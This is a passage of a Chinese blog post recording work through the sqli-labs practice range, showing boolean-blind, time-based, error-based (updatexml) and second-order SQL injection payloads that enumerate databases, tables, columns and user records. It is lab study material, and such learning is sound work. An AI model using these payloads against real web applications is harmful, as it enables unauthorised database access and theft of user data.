+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Waffle666/article/details/111465709">SQL注入之布尔盲注——sql-lab第八关</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45146120/article/details/100104131?utm_source=app">布尔盲注详解</a></p>
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>设置字符串<code>str=&#39;hmhwazyt5799&#39;</code></p>
+<ul>
+<li><code>length(str)</code>返回字符串的长度，<code>12</code></li>
+<li><code>left(str,1)</code>返回字符串<code>str</code>的第<code>1</code>个字符，<code>h</code></li>
+<li><code>ascii(left(str,1))</code>返回<code>h</code>的<code>ascii</code>码，<code>49</code></li>
+<li><code>substr((str),9,4)</code>返回<code>str</code>中从第<code>9</code>个字符开始长度为<code>4</code>的字符串，<code>5799</code></li>
+</ul>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131922873.png" alt="image-20241031214502415" style="zoom:50%;" />
+
+<h3 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h3><p>注：前面求闭合符号略过，传入<code>?id=1&#39;+payload</code>即可。</p>
+<ul>
+<li><strong>爆库名长度</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM tab WHERE id=1 AND (length(database())=8)</span><br></pre></td></tr></table></figure>
+
+<p>设置变量</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923243.png" alt="image-20241031182917813" style="zoom:50%;" />
+
+<p>设置<code>payload</code></p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923213.png" alt="image-20241031183010480" style="zoom:50%;" />
+
+<p>爆破</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923801.png" alt="image-20241031182811644" style="zoom:50%;" />
+
+<p>成功确定数据库名长度为<code>8</code></p>
+<ul>
+<li><strong>爆数据库</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM tab WHERE id=1 AND (left(database(),1)=&#x27;s&#x27;)</span><br><span class="line">SELECT * FROM tab WHERE id=1 AND (ascii(left(database(),1))=57)</span><br><span class="line">SELECT * FROM tab WHERE id=1 AND (ascii(substr(database(),1,1))=57)</span><br></pre></td></tr></table></figure>
+
+<p>设置变量和攻击方式，这里采取<code>Clustter bomb</code>攻击</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923890.png" alt="QQ_1730382622041" style="zoom:50%;" />
+
+<p>设置<code>payload</code></p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923248.png" alt="image-20241031215143950" style="zoom:50%;" />
+
+<img src="https://gitee.com/Qwen11/pic/raw/master/202410312152072.png" alt="image-20241031215206013" style="zoom:50%;" />
+
+<p>爆破</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131923274.png" alt="image-20241031215748696"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131924988.png" alt="image-20241031215539921"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131924216.png" alt="image-20241031215559791"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925373.png" alt="image-20241031215853258"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925770.png" alt="image-20241031220417430"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925213.png" alt="image-20241031220443739"><br><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131925481.png" alt="image-20241031220522121"><br>!<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926572.png" alt="image-20241031220655801"></p>
+<p>成功确定数据库<code>security</code></p>
+<ul>
+<li><strong>爆表个数</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(table_name)</span><br><span class="line">     FROM information_schema.tables </span><br><span class="line">     WHERE table_schema=database())=4</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>爆各个表长度</strong></li>
+</ul>
+<p><strong>注意：</strong><code>length</code>括在<code>select</code>外，二者间要加两个括号。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926656.png" alt="image-20241101144846331" style="zoom:50%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第一个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926738.png" alt="image-20241101144922983" style="zoom:50%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第二个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1))=8</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926472.png" alt="image-20241101144948805" style="zoom:50%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第三个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1))=7</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926955.png" alt="image-20241101145035538" style="zoom:50%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#爆第四个表的长度</span><br><span class="line">AND length((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1))=5</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>爆各个表名</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#第四个表的第一个字符u的ascii码</span><br><span class="line">AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 3,1),1,1))=117</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>爆指定表中列个数</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(column_name) FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)=3</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>爆各个列长度</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#users表中的第2列username的长度</span><br><span class="line">AND length((SELECT column_name FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; LIMIT 1,1))=8</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>爆各个列名</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#users表中的第3列password的第2个字符的ascii码</span><br><span class="line">AND ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; LIMIT 2,1),2,1))=97</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>爆字段个数</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND (SELECT count(username) FROM users)=14</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>爆各个字段长度</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#users表中的username列的第1个字段的长度</span><br><span class="line">AND length((SELECT username FROM users LIMIT 0,1))=4</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>爆字段</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND ascii(substr((SELECT username FROM users LIMIT 0,1),1,1))=68</span><br></pre></td></tr></table></figure>
+
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>​	时间盲注与布尔盲注相似，不同的是执行正确与否的参考，由是否报错变成了是否执行<code>sleep()</code>函数。测试的核心语句是<code>AND if(查询语句,sleep(3),1)</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND if(length(database())=8,sleep(3),1)</span><br><span class="line">#如果 length(database())=8 为真(1),执行sleep(3)</span><br><span class="line">AND elt(length(database())=8,sleep(3))</span><br><span class="line">#如果 length(database())=8 为真(1),执行sleep(3)</span><br></pre></td></tr></table></figure>
+
+<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a><code>POST</code></h2><h3 id="Lass-11"><a href="#Lass-11" class="headerlink" title="Lass-11"></a><code>Lass-11</code></h3><p>输入<code>1&#39;</code>回显信息如下，可以推断出传参格式是<code>username=&#39;&#39; and password=&#39;&#39;</code></p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926143.png" alt="image-20241101193611754" style="zoom:50%;" />
+
+<p>输入<code>1&#39; or 1=1#</code>，得<code>username=&#39;1&#39; or 1=1#&#39;</code>，回显正常，<strong>这里用<code>--+</code>注释会失败，要用<code>#</code>注释</strong></p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926391.png" alt="image-20241101194908735" style="zoom:50%;" />
+
+<p>接下来就按照<code>Pass-1</code>的思路，使用**<code>union</code>联合查询**注入即可</p>
+<h3 id="Lass-12"><a href="#Lass-12" class="headerlink" title="Lass-12"></a><code>Lass-12</code></h3><p>输入<code>1</code>，回显错误，无报错信息</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926822.png" alt="image-20241101200021319" style="zoom: 33%;" />
+
+<p>输入<code>1&#39;</code>，回显错误，无报错信息</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926212.png" alt="image-20241101200059415" style="zoom: 33%;" />
+
+<p>输入<code>1&quot;</code>，回显错误，有报错信息，据此推断出闭合符号为<code>&quot;)</code></p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131926637.png" alt="image-20241101200133728" style="zoom:50%;" />
+
+<p>尝试输入<code>1&quot;) or 1=1#</code>，回显正确</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927444.png" alt="image-20241101200210040" style="zoom:50%;" />
+
+<p>接下来使用**<code>union</code>联合查询**</p>
+<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a><code>Less-17</code></h3><p>​	本题有一个坑，<code>Username</code>中需填入正确的用户名，注入位置在<code>Password</code>处，使用**<code>updatexml()</code>函数报错注入**即可。</p>
+<p>但是当我们爆字段时又出现了另一个问题，输入下面<code>payload</code>时</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,32),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>有如下报错</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927184.png" alt="image-20241101212954595" style="zoom:67%;" />
+
+<p>修改<code>payload</code>，使**<code>select</code>的结果再通过一个中间表<code>select</code>多一次**，便可以绕过上面的问题</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND updatexml(1,concat(0x7e,substr((SELECT group_concat(username) FROM (SELECT * FROM users) as hmhwazyt5799),1,32),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>成功返回<code>username</code>字段内容</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131927517.png" alt="image-20241101214340490" style="zoom:50%;" />
+
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>往往一次注入后，还要注入第二次才能执行命令。</p>
+<p>对于这种</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131919088.png" alt="image-20250111143734313" style="zoom:150%;" />
+
+<p>可以像下面这样注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&quot;||updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过字数限制的一些函数"><a href="#绕过字数限制的一些函数" class="headerlink" title="绕过字数限制的一些函数"></a>绕过字数限制的一些函数</h2><ul>
+<li><code>substr</code></li>
+<li><code>left</code></li>
+<li><strong><code>regexp</code>正则匹配</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select(group_concat(flag))from(users)where(flag)regexp(&#x27;^f&#x27;)</span><br><span class="line">#匹配字符f，并以第一个f开始输出</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>reverse</code>逆转输出</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reverse(select group_concat(flag) from users)</span><br><span class="line">#会倒着从最后一个字符开始输出</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" rel="prev" title="upload-labs靶场通关记录">
+      <i class="fa fa-chevron-left"></i> upload-labs靶场通关记录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E5%9C%BA/" rel="next" title="渗透测试靶机vulnhub_AI-WEB-1.0通关记录">
+      渗透测试靶机vulnhub_AI-WEB-1.0通关记录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+      <!-- require APlayer -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+      <!-- require MetingJS-->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+      <meting-js
+        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
+      </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">基于报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">单引号字符型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E8%BF%98%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.1.</span> <span class="nav-text">字符型注入还是数字型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%98%AF%E5%90%A6%E4%B8%BA%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.2.</span> <span class="nav-text">是否为单引号闭合型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A5%E8%AF%AD%E5%8F%A5%E6%9F%A5%E8%AF%A2%E4%BA%86%E5%87%A0%E5%88%97%E6%95%B0%E6%8D%AE"><span class="nav-number">1.1.3.</span> <span class="nav-text">该语句查询了几列数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%9A%E6%98%BE%E7%A4%BA%E5%93%AA%E5%87%A0%E5%88%97"><span class="nav-number">1.1.4.</span> <span class="nav-text">会显示哪几列</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">1.1.5.</span> <span class="nav-text">查询数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D"><span class="nav-number">1.1.6.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E5%90%8D"><span class="nav-number">1.1.7.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%97%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%86%85%E5%AE%B9"><span class="nav-number">1.1.8.</span> <span class="nav-text">查询列表中的内容</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">数字型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">单引号变形字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.</span> <span class="nav-text">双引号变形字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.5.</span> <span class="nav-text">通过函数报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87floor%E6%8A%A5%E9%94%99"><span class="nav-number">1.5.1.</span> <span class="nav-text">通过floor报错</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml%E6%8A%A5%E9%94%99"><span class="nav-number">1.5.2.</span> <span class="nav-text">updatexml报错</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-number">1.5.2.2.</span> <span class="nav-text">注入流程</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ExtractValue%E6%8A%A5%E9%94%99"><span class="nav-number">1.5.3.</span> <span class="nav-text">ExtractValue报错</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lass-7%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">Lass-7文件写入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#into-outfile%E5%91%BD%E4%BB%A4"><span class="nav-number">2.0.1.</span> <span class="nav-text">into outfile命令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#secure-file-priv%E5%8F%82%E6%95%B0"><span class="nav-number">2.0.1.1.</span> <span class="nav-text">secure_file_priv参数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.0.1.2.</span> <span class="nav-text">条件</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.</span> <span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-number">3.1.</span> <span class="nav-text">相关函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B-1"><span class="nav-number">3.2.</span> <span class="nav-text">注入流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">3.3.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST"><span class="nav-number">5.</span> <span class="nav-text">POST</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Lass-11"><span class="nav-number">5.1.</span> <span class="nav-text">Lass-11</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lass-12"><span class="nav-number">5.2.</span> <span class="nav-text">Lass-12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-17"><span class="nav-number">5.3.</span> <span class="nav-text">Less-17</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%AD%97%E6%95%B0%E9%99%90%E5%88%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0"><span class="nav-number">7.</span> <span class="nav-text">绕过字数限制的一些函数</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_2.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">280k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:14</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
